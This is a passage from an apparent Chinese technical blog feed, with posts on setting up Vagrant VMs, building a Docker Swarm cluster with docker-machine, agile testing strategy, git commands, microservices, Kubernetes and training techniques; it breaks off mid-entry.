        <content type="html"><![CDATA[<h2 id="虚拟机管理工具"><a href="#虚拟机管理工具" class="headerlink" title="虚拟机管理工具"></a>虚拟机管理工具</h2><p>在 window 上下载安装包安装即可，在 Mac 上使用 brew 安装</p><p>安装 VisualBox</p><blockquote><p>brew install caskroom/cask/virtualbox</p></blockquote><p>安装 Vagrant</p><blockquote><p>brew install caskroom/cask/vagrant</p></blockquote><p>可以去 <a href="http://www.vagrantbox.es/" target="_blank" rel="noopener">http://www.vagrantbox.es/</a>  下载 Vagrant 封装好的镜像，然后直接导入，否则自己下载镜像配置。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>添加虚拟机</p><p>可以在 <a href="https://app.vagrantup.com/boxes/search" target="_blank" rel="noopener">https://app.vagrantup.com/boxes/search</a> 上寻找和下载 virtualbox 文件</p><blockquote><p>vagrant box add centos7 /Users/nlin/www/env/centos-7.0-x86_64.box</p></blockquote><p>初始化虚拟机，如果未添加虚拟机文件会自动从仓库里下载，第一次初始化会生成一个 Vagrantfile 文件用于管理素所有命令操作后的变化，利于版本管理:</p><blockquote><p>vagrant init centos7  </p></blockquote><p>vagrant box add 添加时可以给一个不同的名称，用于启动多个虚拟机,这里设置一个 manager 用于 swarm manager:</p><blockquote><p>vagrant box add manager /Users/nlin/www/env/centos-7.0-x86_64.box<br>vagrant init manager</p></blockquote><p>启动虚拟机</p><blockquote><p>vagrant up</p></blockquote><p>查看当前运行的虚拟机</p><blockquote><p>vagrant box list</p></blockquote><p>进入虚拟机</p><blockquote><p>vagrant ssh</p></blockquote><p>更多有用命令</p><blockquote><p>vagrant -h</p></blockquote><p>一份整理好的 vagrant 文件</p><pre><code># -*- mode: ruby -*-# vi: set ft=ruby :$setup_jenkins_server = &lt;&lt;SCRIPTsudo yum -y install ansiblesudo yum -y install gitsudo chown -R ansible /vagrantSCRIPT$setup_ansible_user = &lt;&lt;SCRIPTsudo useradd ansible --groups vagrantsudo mkdir -p /home/ansible/.ssh/ &amp;&amp; sudo cp -rf /home/vagrant/.ssh/authorized_keys /home/ansible/.ssh/authorized_keyssudo chown -R ansible /home/ansible/.sshsudo chmod 600 /home/ansible/.ssh/authorized_keysSCRIPTVagrant.configure(2) do |config|  config.vm.box = &quot;centos/7&quot;  config.vm.provider &quot;virtualbox&quot; do |v|    v.memory = 1024  end  config.vm.box_check_update = false  VAGRANT_COMMAND = ARGV[0]  if VAGRANT_COMMAND == &quot;ssh&quot;    config.ssh.username = &#39;ansible&#39;  end  config.vm.define &quot;jenkins-server&quot; do |dev|    config.vm.synced_folder &quot;.&quot;, &quot;/vagrant&quot;    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.10&quot;    dev.vm.hostname = &quot;jenkins-server&quot;    dev.vm.provision :shell, inline: $setup_ansible_user    dev.vm.provision :shell, inline: $setup_jenkins_server  end  config.vm.define &quot;jenkins-agent-1&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.11&quot;    dev.vm.hostname = &quot;jenkins-agent&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  end  config.vm.define &quot;manager1&quot; do |dev|    config.vm.provider &quot;virtualbox&quot; do |v|      v.memory = 2048    end    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.21&quot;    dev.vm.hostname = &quot;manager1&quot;    dev.vm.provision :shell, inline: $setup_ansible_user    # dev.vm.network :forwarded_port, guest: 80, host: 9080  end   config.vm.define &quot;manager2&quot; do |dev|     config.vm.provider &quot;virtualbox&quot; do |v|       v.memory = 2048     end     dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.22&quot;     dev.vm.hostname = &quot;manager2&quot;     dev.vm.provision :shell, inline: $setup_ansible_user   end  config.vm.define &quot;worker1&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.23&quot;    dev.vm.hostname = &quot;worker1&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  end  config.vm.define &quot;worker2&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.24&quot;    dev.vm.hostname = &quot;worker2&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  endend</code></pre><p>只需要创建文件 Vagrantfile 并粘贴上面内容，然后运行：</p><blockquote><p>vagrant up</p></blockquote><p>可以快速的创建一组虚拟机。启动成功后，运行 provision 命令初始化 ansible 以及 docker 等基本工具。</p><p>服务器上的 Jenkins 机器需要自己手动安装 ansible 以及 git， 最好配置一个 ansible user，否则修改 hosts 中 ansible_user 使用 root 用户连接。</p><blockquote><p>yum -y install ansible<br>yum -y install git</p></blockquote><p>其他机器全部使用 ansible 来操作。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>官方文档 <a href="https://www.vagrantup.com/docs/index.html" target="_blank" rel="noopener">https://www.vagrantup.com/docs/index.html</a></li><li>安装方法 <a href="https://blog.csdn.net/yanyan42/article/details/79697659" target="_blank" rel="noopener">https://blog.csdn.net/yanyan42/article/details/79697659</a></li><li>一个快速上手教程 <a href="https://www.jianshu.com/p/7e8f61376053" target="_blank" rel="noopener">https://www.jianshu.com/p/7e8f61376053</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Swarm</title>
      <link href="/docker/docker/swarm/"/>
      <url>/docker/docker/swarm/</url>
      
        <content type="html"><![CDATA[<p>Docker 官方容器编排工具。</p><p>Docker 编排的几种模式</p><ul><li>Docker for desktop </li><li>Swarm 官方的编排工具</li><li>K8s 社区最火的编排工具</li></ul><h2 id="Swarm-相关概念"><a href="#Swarm-相关概念" class="headerlink" title="Swarm 相关概念"></a>Swarm 相关概念</h2><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><p>安装了 Docker 的一个物理机或者虚拟机，节点分为管理节点和工作节点。</p><p>管理节点分为 Leader 和 follower，管理节点最好是奇数。他们之间会自动选举，leader，生产上不建议将管理节点和工作节点放到一台服务器上。</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack 指一个应用需要的一整套容器，例如前端、后端API、BFF等，由多个 service 构成。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>一个 Service 指一个 docker compose运行后的一个服务，可以存在多个容器的副本</p><h3 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h3><p>一个Docker镜像</p><h3 id="network"><a href="#network" class="headerlink" title="network"></a>network</h3><p>容器的网络和虚拟机的网络概念上类似，桥接模式、host模式，但是非常重要的一个网络模式是overlay。类似于网络中的 VLAN，可以在不同容器之间建立一个虚拟网络。</p><h3 id="Volumes"><a href="#Volumes" class="headerlink" title="Volumes"></a>Volumes</h3><p>容器运行需要的存储空间。</p><h2 id="docker-swarm-常见命令"><a href="#docker-swarm-常见命令" class="headerlink" title="docker swarm 常见命令"></a>docker swarm 常见命令</h2><h3 id="查看运行的-service"><a href="#查看运行的-service" class="headerlink" title="查看运行的 service"></a>查看运行的 service</h3><blockquote><p>docker service list </p></blockquote><h3 id="查看某个日志"><a href="#查看某个日志" class="headerlink" title="查看某个日志"></a>查看某个日志</h3><blockquote><p>docker service logs [servicename]</p></blockquote><h2 id="搭建-swarm-集群实战"><a href="#搭建-swarm-集群实战" class="headerlink" title="搭建 swarm 集群实战"></a>搭建 swarm 集群实战</h2><p>在本机练习可以使用 docker-machine 来创建数台虚拟机练习网络。</p><p>使用 docker-machine 创建一个虚拟机，最好使用 virtualbox 作为虚拟机管理工具。当然也可以使用 vagrant 作为虚拟机管理工具。</p><blockquote><p>docker-machine create –driver virtualbox manager1</p></blockquote><pre><code>Running pre-create checks...(manager1) No default Boot2Docker ISO found locally, downloading the latest release...(manager1) Latest release for github.com/boot2docker/boot2docker is v19.03.5(manager1) Downloading /Users/nlin/.docker/machine/cache/boot2docker.iso from https://github.com/boot2docker/boot2docker/releases/download/v19.03.5/boot2docker.iso...(manager1) 0%....10%....20%....30%....40%....50%....60%....70%....80%....90%....100%Creating machine...(manager1) Copying /Users/nlin/.docker/machine/cache/boot2docker.iso to /Users/nlin/.docker/machine/machines/manager1/boot2docker.iso...(manager1) Creating VirtualBox VM...(manager1) Creating SSH key...(manager1) Starting the VM...(manager1) Check network to re-create if needed...(manager1) Found a new host-only adapter: &quot;vboxnet0&quot;(manager1) Waiting for an IP...Waiting for machine to be running, this may take a few minutes...Detecting operating system of created instance...Waiting for SSH to be available...Detecting the provisioner...Provisioning with boot2docker...Copying certs to the local machine directory...Copying certs to the remote machine...Setting Docker configuration on the remote daemon...Checking connection to Docker...Docker is up and running!To see how to connect your Docker Client to the Docker Engine running on this virtual machine, run: docker-machine env manager1</code></pre><p>这个阶段耗时比较长，创建成功之后可以使用 docker-machine env 命令查看虚拟机信息，这个过程可能需要翻墙才能成功拉取镜像。</p><blockquote><p>docker-machine env manager1</p></blockquote><pre><code>export DOCKER_TLS_VERIFY=&quot;1&quot;export DOCKER_HOST=&quot;tcp://192.168.99.100:2376&quot;export DOCKER_CERT_PATH=&quot;/Users/nlin/.docker/machine/machines/manager1&quot;export DOCKER_MACHINE_NAME=&quot;manager1&quot;# Run this command to configure your shell: # eval $(docker-machine env manager1)</code></pre><p>使用  docker-machine ls 可以查看运行的虚拟机</p><blockquote><p>docker-machine ls</p></blockquote><pre><code>NAME       ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER     ERRORSmanager1   -        virtualbox   Running   tcp://192.168.99.100:2376           v19.03.5   </code></pre><p>再创建一个虚拟机，作为 swarm 的 worker</p><blockquote><p>docker-machine create –driver virtualbox manager1</p></blockquote><p>现在有两台机器了，在 manager 中初始化集群。</p><blockquote><p>docker-machine ssh manager1 docker swarm init –listen-addr 192.168.99.100:2337 –advertise-addr 192.168.99.100</p></blockquote><p>会得到一个集群的 token ，使用这个 token 可以进行后续的操作。</p><pre><code>Swarm initialized: current node (ifzgulv2nsw5r84dw55f8vut0) is now a manager.To add a worker to this swarm, run the following command:    docker swarm join --token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.</code></pre><p>在真实的机器上，不会使用 docker-machine ssh 命令，初始化集群的命令直接就是：</p><blockquote><p>docker swarm init –listen-addr 192.168.99.100:2337 –advertise-addr 192.168.99.100</p></blockquote><p>接下来把 worker1 加入集群:</p><blockquote><p>docker-machine ssh worker1 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337</p></blockquote><pre><code>This node joined a swarm as a worker.</code></pre><p>然后两台机器就被添加到集群了。进入其中一个管理节点，可以使用 docker node 命令查看节点信息。</p><blockquote><p>docker-machine ssh manager1 docker node ls</p></blockquote><p>能看到两台机器已经在集群里面作为 node 存在</p><pre><code>ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSIONifzgulv2nsw5r84dw55f8vut0 *   manager1            Ready               Active              Leader              19.03.5iwtggbei2por21t4z9q3x9usx     worker1             Ready               Active                                  19.03.5</code></pre><p>接下来创建更多的虚拟器 manager2、worker1、worker2、worker3</p><blockquote><p>docker-machine create –driver virtualbox manager2<br>docker-machine create –driver virtualbox worker2<br>docker-machine create –driver virtualbox worker3</p></blockquote><p>也将他们加入集群，然后就可以部署应用了。</p><blockquote><p>docker-machine ssh worker2 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337<br>docker-machine ssh worker3 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337</p></blockquote><p>加入 manager 需要先获取 manager 的token，到 leader 的机器上获取 token</p><blockquote><p>docker-machine ssh manager1 docker swarm jon-token manager</p></blockquote><pre><code>To add a manager to this swarm, run the following command:    docker swarm join --token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-4tbwy1t6rnlfjn1lnw84v13bq 192.168.99.100:2337</code></pre><p>将 manager2 加入集群</p><blockquote><p>docker-machine ssh manager2 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-4tbwy1t6rnlfjn1lnw84v13bq 192.168.99.100:2337</p></blockquote><p>这样我们共有 5 台机器。</p><pre><code>ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSIONifzgulv2nsw5r84dw55f8vut0     manager1            Ready               Active              Leader              19.03.5ypzwukwsof5ec7r4itkvkzxa3 *   manager2            Ready               Active              Reachable           19.03.5iwtggbei2por21t4z9q3x9usx     worker1             Ready               Active                                  19.03.5sdtzfghzoafij246b272ob4wl     worker2             Ready               Active                                  19.03.5uc27drfjn1anv01yy24y9d5g5     worker3             Ready               Active                                  19.03.5</code></pre><p>这样一个 swarm 集群就建立好了，然后可以对它进行一些管理。</p><p>查看网络：</p><blockquote><p>docker-machine ssh manager1 docker network ls</p></blockquote><h2 id="部署应用到集群"><a href="#部署应用到集群" class="headerlink" title="部署应用到集群"></a>部署应用到集群</h2><p>使用 nginx 打一镜像用于部署前端项目，编写如下 docker-compose.yml 文件</p><pre><code>version: &quot;3.5&quot;services:  frontend:    image: linksgo2011/frontend:latest    networks:      - sample-network    ports:      - 8000:80    deploy:      replicas: 1      labels:        app: sample-app        environment: localnetworks:  sample-network:    driver: overlay</code></pre><p>使用 docker-machine 的 scp命令拷贝 compose 文件到一台 manager 中</p><blockquote><p>docker-machine scp  docker-compose.yml docker@manager1:~/docker-compose.yml</p></blockquote><p>然后在这台 manager 中执行 stack 部署命令</p><blockquote><p>docker-machine ssh manager1 docker stack deploy -c docker-compose.yml sample-stack</p></blockquote><p>Docker 会自动帮助创建网络，然后部署 sample-stack 到 worker 中。</p><p>可以查看部署的服务</p><blockquote><p>docker-machine ssh manager1 docker service ls</p></blockquote><p>ID                  NAME                    MODE                REPLICAS            IMAGE                         PORTS<br>ovifr1oldnc7        sample-stack_frontend   replicated          1/1                 linksgo2011/frontend:latest   *:8000-&gt;80/tcp</p><p>可以查看某个服务的日志，对调试和排错非常有用</p><blockquote><p>docker-machine ssh manager1 docker service logs  sample-stack_frontend</p></blockquote><h2 id="docker-swarm-一些调试方法"><a href="#docker-swarm-一些调试方法" class="headerlink" title="docker swarm 一些调试方法"></a>docker swarm 一些调试方法</h2><p>查看 service 无法启动的错误信息</p><blockquote><p>docker service ps –no-trunc {serviceName}</p></blockquote><p>查看服务的 task</p><blockquote><p>docker service ps <service-name></service-name></p></blockquote><p>查看 task 的启动情况，可以看到容器、节点情况</p><blockquote><p>docker inspect <task-id></task-id></p></blockquote><p>找到了容器可以查看日志</p><blockquote><p>docker logs <container-id></container-id></p></blockquote><p>daemon.json 可以开启 debug 模式。</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>使用 docker-compose 部署应用</li><li>容器内部的通信</li><li>使用 Jenkins 自动化搭建 swarm 集群</li><li>安装 portainer</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.xiodi.cn/?s=swarm" target="_blank" rel="noopener">https://blog.xiodi.cn/?s=swarm</a></li><li><a href="https://docs.docker.com/v17.09/engine/swarm/" target="_blank" rel="noopener">https://docs.docker.com/v17.09/engine/swarm/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>敏捷中的测试策略</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/QA-in-agile/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/QA-in-agile/</url>
      
        <content type="html"><![CDATA[<h2 id="常用QA概念"><a href="#常用QA概念" class="headerlink" title="常用QA概念"></a>常用QA概念</h2><ul><li>测试金字塔: unit-&gt;service-&gt;UI, 伴随测试成本投入,收益减少。unit为测试- 性价比最高的方式</li><li>冒烟测试: sanity测试,快速验证应用是否能工作。</li><li>BDD测试: 基于业务的测试思想。</li><li>E2E测试: 端对端测试。</li><li>Functional: E2E测试。</li><li>渗透测试：破坏性的测试，测试系统安全性</li><li>架构测试：测试架构是否被破坏</li><li>探索性测试:同时设计测试和执行测试。探索性测试有时候会与即兴测试（ad hoc testing）混淆。即兴测试通常是指临时准备的、即兴的Bug搜索测试过程。从定义可以看出，谁都可以做即兴测试。由Cem Kaner提出的探索性测试，相比即兴测试是一种精致的、有思想的过程。</li></ul><h2 id="常用测试工具"><a href="#常用测试工具" class="headerlink" title="常用测试工具"></a>常用测试工具</h2><ul><li>selenium 可以驱动浏览器，模拟真实用户</li><li>jemeter 性能测试工具</li><li>archunit 架构测试工具</li></ul><h2 id="测试用例设计"><a href="#测试用例设计" class="headerlink" title="测试用例设计"></a>测试用例设计</h2><ul><li>Boundary Value Analysis 边界值分析</li><li>Equivalence Partitioning 等价划分</li><li>Causal Diagram 因果图</li><li>Decision Table 判定表</li></ul>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>测试策略</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/testing-strategy/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/testing-strategy/</url>
      
        <content type="html"><![CDATA[<p>一个项目需要做多少测试，做到什么程度，这属于测试策略的范畴。</p><h2 id="分层测试"><a href="#分层测试" class="headerlink" title="分层测试"></a>分层测试</h2><ul><li>API 层使用 MockMVC 进行简单的测试，目的是快速验证，mock 掉 Service<ul><li>测试的目标是返回的状态码等等信息</li></ul></li><li>Service 层结合 Repository 测试，测试业务逻辑，结合 DataFixture 来进行测试，这是测试重心之一</li><li>Domain 测试使用纯的单元测试，测试业务逻辑, domain 保持干净可以不使用 Mock 工具,这也是测试重心</li><li>Repository 有 ORM 实现，在 Service 处做测试</li></ul><h2 id="测试块描述风格"><a href="#测试块描述风格" class="headerlink" title="测试块描述风格"></a>测试块描述风格</h2><p>使用驼峰描述单元测试, 必须满足 it should xxx [when xxx] 格式</p><p>例如 </p><blockquote><p>it should return user list</p></blockquote><h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>DataFixture 以实体为单位准备</p><h2 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h2><p>只做 API 测试，使用 user journey 测试方法，覆盖所有场景，本质上是一种集成测试方法。</p><p>断言各司其职，例如创建用户的测试需要断言创建后的信息，但是编辑的时候直接使用创建用户的场景，但不对用户创建再次断言。</p><p>集成测试只负责 Happy Path 测试</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>real time web 实时协作方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/real-time/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/real-time/</url>
      
        <content type="html"><![CDATA[<h2 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h2><ul><li>webSocket<br>-java </li><li>Kafka</li><li>mongo db</li></ul><p>## </p><ul><li><a href="http://fex.baidu.com/blog/2014/04/realtime-collaboration/" target="_blank" rel="noopener">http://fex.baidu.com/blog/2014/04/realtime-collaboration/</a></li><li><a href="https://github.com/Operational-Transformation/ot.js/" target="_blank" rel="noopener">https://github.com/Operational-Transformation/ot.js/</a> OT 算法 </li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>kafka</title>
      <link href="/Kafka/kafka/kafka/"/>
      <url>/Kafka/kafka/kafka/</url>
      
        <content type="html"><![CDATA[<p>一款高性能消息中间件。kafka 依赖 zookeeper 作为分布式协调工具。<br>下载地址：<a href="https://www.apache.org/dyn/closer.cgi?path=/kafka/2.3.0/kafka_2.12-2.3.0.tgz" target="_blank" rel="noopener">https://www.apache.org/dyn/closer.cgi?path=/kafka/2.3.0/kafka_2.12-2.3.0.tgz</a></p><h1 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h1><ul><li><a href="https://kafka.apache.org/quickstart" target="_blank" rel="noopener">https://kafka.apache.org/quickstart</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Kafka </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用的GIT命令</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/Git%20commands/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/Git%20commands/</url>
      
        <content type="html"><![CDATA[<p>配置全局邮箱和名字</p><blockquote><p>git config –global user.email “email”</p></blockquote><blockquote><p>git config –global user.name “name”</p></blockquote><p>查看服务器和本地上分支</p><blockquote><p>git branch -a</p></blockquote><p>获取服务器分支并映射到本地</p><blockquote><p>git fetch origin 远程分支名x:本地分支名x</p></blockquote><p>设置pull  push映射</p><blockquote><p>git branch –set-upstream-to=origin/<branch> localBranchName</branch></p></blockquote><p>临时缓存本地更改并清空工作区</p><blockquote><p>git stash </p></blockquote><p>从 stash 中取出</p><blockquote><p>git stash pop</p></blockquote><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li><a href="http://onlywei.github.io/explain-git-with-d3/#branch" target="_blank" rel="noopener">http://onlywei.github.io/explain-git-with-d3/#branch</a>  Explain Git with D3</li><li><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">https://learngitbranching.js.org/</a> Learn Git Branching</li><li><a href="https://github.com/Gazler/githug" target="_blank" rel="noopener">https://github.com/Gazler/githug</a> Lean git by game </li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微服务</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/microservice/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/microservice/</url>
      
        <content type="html"><![CDATA[<p>微服务 (Microservices) 是一种软体架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模组化的方式组合出复杂的大型应用程式，各功能区块使用与语言无关 (Language-Independent/Language agnostic) 的 API 集相互通讯。</p><h2 id="一些微服务的样例代码"><a href="#一些微服务的样例代码" class="headerlink" title="一些微服务的样例代码"></a>一些微服务的样例代码</h2><ul><li><a href="https://gitee.com/peter.e.king/goodeen" target="_blank" rel="noopener">https://gitee.com/peter.e.king/goodeen</a> 基于springboot微服务的maven项目，技术栈是 Mybatis + shiro + spring aop事务</li><li><a href="https://gitee.com/yu120/neural" target="_blank" rel="noopener">https://gitee.com/yu120/neural</a> 并发控制、限流、熔断</li><li><a href="https://gitee.com/log4j/pig" target="_blank" rel="noopener">https://gitee.com/log4j/pig</a> 微服务权限管理</li><li><a href="https://github.com/joecao/qbike" target="_blank" rel="noopener">https://github.com/joecao/qbike</a> A demo of share bike using DDD, MicroService and Spring Cloud</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zh.wikipedia.org/zh-hans/%E5%BE%AE%E6%9C%8D%E5%8B%99" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/%E5%BE%AE%E6%9C%8D%E5%8B%99</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>云原生</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/cloud-native/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/cloud-native/</url>
      
        <content type="html"><![CDATA[<p>云原生包含了一组应用的模式，用于帮助企业快速，持续，可靠，规模化地交付业务软件。云原生由微服务架构，DevOps 和以容器为代表的敏捷基础架构组成。</p><p>通俗来说就是整合了微服务、容器化、Devops、持续交付得个概念集合。</p><h2 id="参考代码仓库"><a href="#参考代码仓库" class="headerlink" title="参考代码仓库"></a>参考代码仓库</h2><ul><li><a href="https://github.com/tw-cloud-native" target="_blank" rel="noopener">https://github.com/tw-cloud-native</a> 一套容器化的微服务应用集合</li><li><a href="https://github.com/easzlab/kubeasz" target="_blank" rel="noopener">https://github.com/easzlab/kubeasz</a> 一套 K8s 部署工具</li></ul><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="http://dockone.io/article/2991" target="_blank" rel="noopener">http://dockone.io/article/2991</a>  云原生架构概述<em>**</em></li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>kubernetes</title>
      <link href="/docker/docker/kubernetes/"/>
      <url>/docker/docker/kubernetes/</url>
      
        <content type="html"><![CDATA[<p>Kubernetes（k8s）是一个开源的，用于管理云平台中多个主机上的容器化的应用，Kubernetes的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes提供了应用部署，规划，更新，维护的一种机制。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://www.kubernetes.org.cn/k8s" target="_blank" rel="noopener">https://www.kubernetes.org.cn/k8s</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>通用培训技巧和方法</title>
      <link href="/%E5%9F%B9%E8%AE%AD/training/training-skills-in-general/"/>
      <url>/%E5%9F%B9%E8%AE%AD/training/training-skills-in-general/</url>
      
        <content type="html"><![CDATA[<h2 id="课程设计"><a href="#课程设计" class="headerlink" title="课程设计"></a>课程设计</h2><ul><li>内容设计</li><li>任务设计</li><li>验收设计<ul><li>对学员的验收<ul><li>实时验收<ul><li>学员是否能回答问题？</li><li></li></ul></li><li>最终验收<ul><li>模拟项目和showcase</li><li>学员评价表<ul><li>客户验收</li></ul></li></ul></li><li>每周总结</li></ul></li></ul></li><li>案例设计</li><li>奖品设计<ul><li>团体</li><li>个人<ul><li>最佳搭档奖</li><li>最佳成长</li></ul></li></ul></li><li>agenda<ul><li>教学总纲，每日教学内容</li><li>每日教学任务细则 </li></ul></li></ul><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>场地设置和物料<ul><li>agenda </li><li>ground rule</li><li>parking lot</li><li>名牌</li><li>麦克风</li><li>投影仪</li><li>翻页笔</li><li>视频连接线</li><li>白板</li><li>白板纸</li><li>马克笔</li><li>网络<ul><li>GitHub</li><li>NPM</li><li>Maven仓库</li></ul></li><li>海报</li></ul></li><li>课程准备</li></ul><h2 id="培训中"><a href="#培训中" class="headerlink" title="培训中"></a>培训中</h2><ul><li>破冰</li><li>使用 “讲师发音”</li><li>逻辑大于内容</li><li>给出清晰的指令</li><li>记住学员名字</li><li>避免 “你” “你们”，说 “我们”</li><li>适度开 “玩笑”</li><li>代码演示<ul><li>Presentation mode</li><li>快捷键插件</li></ul></li><li>提问<ul><li>问题类型<ul><li>封闭式问题，容易从听众获得答案，但互动性查，不够发散</li><li>开放式问题，适合讨论，但是再建立信任</li></ul></li><li>提问技巧<ul><li>先开放再封闭</li><li>预设回答者</li><li>传话筒的提问方式</li><li>自问自答</li><li>调动性发问：”xxx 右边的同学请回答xxx”，调动xxx以及周边学员的参与感。</li></ul></li><li>回答<ul><li>回答不了的情况？<ul><li>反问</li><li>parking lot</li></ul></li></ul></li></ul></li><li>互动<ul><li>occupy signs</li><li>游戏<ul><li>摇塞子</li></ul></li></ul></li><li>学员跟踪<ul><li>记住学员名字</li></ul></li></ul><h2 id="培训后"><a href="#培训后" class="headerlink" title="培训后"></a>培训后</h2><ul><li>分发课件</li><li>收集反馈</li><li>结束仪式</li><li>QA</li><li>合影或视频</li><li>验证培训结果<ul><li>学员培训报告</li></ul></li></ul><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ul><li>学员注意力不集中</li><li>不遵守规则</li><li>遇到常见问题</li><li>完成练习后依然不理解一些概念</li><li>学员问出比较有挑战的问题</li><li>问题和showcase 没有回应</li><li>时间控制<ul><li>做好规划，包括休息时间</li></ul></li><li>学员问题太多</li><li>接收反馈后依然没有改变</li><li>部分学员非常主动，独占焦点</li><li>学员比较沉闷，学习没有动力<ul><li>游戏，cup song 《Gamestorming:创新、变革&amp;非凡思维训练》</li><li>活动</li></ul></li><li>不知道学员是否理解了你传递的信息<ul><li>问问题</li></ul></li><li>遇到一些意外的问题<ul><li>开发中的常态</li></ul></li><li>学员练习超时了<ul><li>如果有几个学员都遇到的问题，可以可视化出来给所有学员</li></ul></li><li>讲师如何在演示编写代码时学员能更上<ul><li>快捷键提示插件</li><li>小步提交</li><li>快速反馈</li></ul></li></ul><h2 id="参与人管理"><a href="#参与人管理" class="headerlink" 